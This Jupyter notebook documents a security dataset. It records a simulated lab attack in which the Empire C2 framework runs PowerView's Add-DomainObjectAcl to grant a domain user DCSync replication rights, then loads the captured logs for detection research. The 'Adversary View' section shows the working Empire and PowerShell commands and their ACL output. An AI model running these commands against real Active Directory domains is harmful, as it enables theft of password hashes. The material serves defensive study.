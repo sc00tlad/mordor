{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d1c7feaf",
   "metadata": {},
   "source": [
    "# Empire Powerview Add-DomainObjectAcl"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "221284d6",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1a5539c3",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/01 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1222.001](https://attack.mitre.org/techniques/T1222/001) |\n",
    "| Tags              | AD Object Modification,AD Object nTSecurityDescriptor,LDAP ModifyRequest |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e1417d1d",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "These datasets represent adversaries with enough permissions (i.e. domain admin) adding an access control entry (ACE) to the discretionary access control list (DACL) of an Active Directory object (i.e Root Domain). One example could be adversaries modifying the root domain DACL to allow a specific domain user, despite being in no privileged groups and not having local admin rights on the domain controller itself, to use Active Directory replication services and obtain secret domain data (i.e. Other user NTLM Hashes)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0f33bc4",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cea8919c",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_powerview_ldap_ntsecuritydescriptor.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_powerview_ldap_ntsecuritydescriptor.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/network/empire_powerview_ldap_ntsecuritydescriptor.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/network/empire_powerview_ldap_ntsecuritydescriptor.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "98731e06",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6e1190ff",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f0333bd0",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [powerview](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55ceda19",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n",
    "\n",
    "8BUCWV1P ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2488   5/0.0    2020-09-21 17:09:43  http            \n",
    "\n",
    "(Empire: agents) > interact 8BUCWV1P\n",
    "(Empire: 8BUCWV1P) > scriptimport data/module_source/situational_awareness/network/powerview.ps1\n",
    "[*] Tasked 8BUCWV1P to run TASK_SCRIPT_IMPORT\n",
    "[*] Agent 8BUCWV1P tasked with task ID 1\n",
    "(Empire: 8BUCWV1P) > \n",
    "script successfully saved in memory\n",
    "\n",
    "(Empire: 8BUCWV1P) > scriptcmd Add-DomainObjectAcl -TargetIdentity \"dc=theshire,dc=local\" -TargetDomain theshire.local -PrincipalIdentity nmartha -Rights DCSync\n",
    "[*] Tasked 8BUCWV1P to run TASK_SCRIPT_COMMAND\n",
    "[*] Agent 8BUCWV1P tasked with task ID 2\n",
    "(Empire: 8BUCWV1P) > \n",
    "Job started: 5WSPKL\n",
    "\n",
    "(Empire: 8BUCWV1P) > scriptcmd $nmarthaSid = Get-DomainUser nmartha | Select-Object -ExpandProperty objectsid; Get-DomainObjectACL  \"dc=theshire,dc=local\" -Domain theshire.local -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $nmarthaSid}\n",
    "[*] Tasked 8BUCWV1P to run TASK_SCRIPT_COMMAND\n",
    "[*] Agent 8BUCWV1P tasked with task ID 3\n",
    "(Empire: 8BUCWV1P) > \n",
    "Job started: YG1ZB3\n",
    "\n",
    "AceQualifier           : AccessAllowed\n",
    "ObjectDN               : DC=theshire,DC=local\n",
    "ActiveDirectoryRights  : ExtendedRight\n",
    "ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set\n",
    "ObjectSID              : S-1-5-21-4228717743-1032521047-1810997296\n",
    "InheritanceFlags       : None\n",
    "BinaryLength           : 56\n",
    "AceType                : AccessAllowedObject\n",
    "ObjectAceFlags         : ObjectAceTypePresent\n",
    "IsCallback             : False\n",
    "PropagationFlags       : None\n",
    "SecurityIdentifier     : S-1-5-21-4228717743-1032521047-1810997296-1103\n",
    "AccessMask             : 256\n",
    "AuditFlags             : None\n",
    "IsInherited            : False\n",
    "AceFlags               : None\n",
    "InheritedObjectAceType : All\n",
    "OpaqueLength           : 0\n",
    "\n",
    "AceQualifier           : AccessAllowed\n",
    "ObjectDN               : DC=theshire,DC=local\n",
    "ActiveDirectoryRights  : ExtendedRight\n",
    "ObjectAceType          : DS-Replication-Get-Changes\n",
    "ObjectSID              : S-1-5-21-4228717743-1032521047-1810997296\n",
    "InheritanceFlags       : None\n",
    "BinaryLength           : 56\n",
    "AceType                : AccessAllowedObject\n",
    "ObjectAceFlags         : ObjectAceTypePresent\n",
    "IsCallback             : False\n",
    "PropagationFlags       : None\n",
    "SecurityIdentifier     : S-1-5-21-4228717743-1032521047-1810997296-1103\n",
    "AccessMask             : 256\n",
    "AuditFlags             : None\n",
    "IsInherited            : False\n",
    "AceFlags               : None\n",
    "InheritedObjectAceType : All\n",
    "OpaqueLength           : 0\n",
    "\n",
    "AceQualifier           : AccessAllowed\n",
    "ObjectDN               : DC=theshire,DC=local\n",
    "ActiveDirectoryRights  : ExtendedRight\n",
    "ObjectAceType          : DS-Replication-Get-Changes-All\n",
    "ObjectSID              : S-1-5-21-4228717743-1032521047-1810997296\n",
    "InheritanceFlags       : None\n",
    "BinaryLength           : 56\n",
    "AceType                : AccessAllowedObject\n",
    "ObjectAceFlags         : ObjectAceTypePresent\n",
    "IsCallback             : False\n",
    "PropagationFlags       : None\n",
    "SecurityIdentifier     : S-1-5-21-4228717743-1032521047-1810997296-1103\n",
    "AccessMask             : 256\n",
    "AuditFlags             : None\n",
    "IsInherited            : False\n",
    "AceFlags               : None\n",
    "InheritedObjectAceType : All\n",
    "OpaqueLength           : 0\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eefd2ffd",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2723d87a",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3004741c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_powerview_ldap_ntsecuritydescriptor.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08b42fb8",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "093c56e9",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44610041",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "557357f8",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aef99e5d",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md#atomic-test-1---pad-binary-to-change-hash---linuxmacos-dd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md#atomic-test-1---pad-binary-to-change-hash---linuxmacos-dd) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
